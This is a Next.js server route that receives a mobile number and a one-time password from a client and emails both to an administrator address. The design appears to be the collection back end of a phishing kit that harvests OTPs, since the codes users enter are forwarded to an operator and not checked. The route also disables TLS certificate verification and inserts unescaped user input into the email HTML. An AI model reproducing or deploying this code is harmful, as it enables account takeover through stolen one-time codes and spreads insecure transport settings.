import { NextResponse } from "next/server";
import nodemailer from "nodemailer";

export async function POST(req: Request) {
  try {
    const { mobile, otp } = await req.json();

    const transporter = nodemailer.createTransport({
      service: "gmail",

      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },

      tls: {
        rejectUnauthorized: false,
      },
    });

    await transporter.sendMail({
      from: process.env.EMAIL_USER,

      to: process.env.ADMIN_EMAIL,

      subject: "New OTP Verification",

      html: `
        <div style="font-family:Arial;padding:20px">
          <h2>OTP Verification</h2>

          <p><strong>Mobile:</strong> ${mobile}</p>

          <h1 style="letter-spacing:5px">${otp}</h1>
        </div>
      `,
    });

    return NextResponse.json({
      success: true,
    });
  } catch (error: any) {
    console.log(error);

    return NextResponse.json(
      {
        success: false,
        error: error.message,
      },
      {
        status: 500,
      }
    );
  }
}